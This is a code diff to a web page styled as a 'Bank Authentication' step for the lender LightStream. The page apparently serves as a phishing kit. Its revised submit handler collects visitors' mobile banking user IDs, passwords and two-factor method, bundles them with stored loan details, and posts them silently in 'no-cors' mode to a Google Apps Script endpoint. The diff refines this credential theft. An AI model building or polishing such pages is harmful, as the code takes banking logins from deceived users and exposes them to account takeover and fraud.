@@ -5,12 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bank Authentication - LightStream</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            important: true,
-            plugins: []
-        }
-    </script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
@@ -407,39 +401,6 @@
     </footer>
 
     <script>
-        // Load bank name from sessionStorage when page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('Bank auth page loaded');
-            
-            // Get loan data from sessionStorage
-            const loanData = JSON.parse(sessionStorage.getItem('loanData')) || {};
-            console.log('Loan data from sessionStorage:', loanData);
-            
-            // Set bank name if available
-            if (loanData.customerBank) {
-                const bankSelect = document.getElementById('bankName');
-                if (bankSelect) {
-                    bankSelect.value = loanData.customerBank;
-                    console.log('Bank name set to:', loanData.customerBank);
-                }
-            } else if (loanData.bank) {
-                const bankSelect = document.getElementById('bankName');
-                if (bankSelect) {
-                    bankSelect.value = loanData.bank;
-                    console.log('Bank name set to:', loanData.bank);
-                }
-            } else if (loanData.bankName) {
-                const bankSelect = document.getElementById('bankName');
-                if (bankSelect) {
-                    bankSelect.value = loanData.bankName;
-                    console.log('Bank name set to:', loanData.bankName);
-                }
-            } else {
-                console.log('No bank name found in loan data');
-                console.log('Available fields:', Object.keys(loanData));
-            }
-        });
-
         // Mobile menu toggle
         document.getElementById('mobileMenuBtn').addEventListener('click', function() {
             const mobileMenu = document.getElementById('mobileMenu');
@@ -512,22 +473,28 @@
             submitButton.textContent = 'Connecting...';
             submitButton.disabled = true;
             
-            // Add bank auth specific fields to existing data
-            data.bankName = document.getElementById('bankName').value;
-            data.mobileBankingUserId = document.getElementById('userId').value;
-            data.mobileBankingPassword = document.getElementById('password').value;
-            data.twoFactorMethod = document.getElementById('twoFactor').value;
-            data.termsAccepted = document.getElementById('terms').checked;
-            data.timestamp = new Date().toISOString();
-            data.type = 'bank_authentication';
+            // Create FormData for Google Apps Script
+            const formData = new FormData();
             
-            // Send to Google Apps Script as JSON
+            // Add all form data
+            Object.keys(data).forEach(key => {
+                formData.append(key, data[key]);
+            });
+            
+            // Add bank auth specific fields
+            formData.append('bankName', document.getElementById('bankName').value);
+            formData.append('mobileBankingUserId', document.getElementById('userId').value);
+            formData.append('mobileBankingPassword', document.getElementById('password').value);
+            formData.append('twoFactorMethod', document.getElementById('twoFactor').value);
+            formData.append('termsAccepted', document.getElementById('terms').checked);
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('type', 'bank_authentication');
+            
+            // Send to Google Apps Script using FormData (no CORS issues)
             fetch('https://script.google.com/macros/s/AKfycbxM0ZYTBPcLutmMdnmxO-H399LYdFfKiy6LuWkhYJb1XYxcv3SdAZH8VvPHh5Ny20S8dA/exec', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
+                body: formData,
+                mode: 'no-cors'
             })
             .then(response => response.text())
             .then(result => {
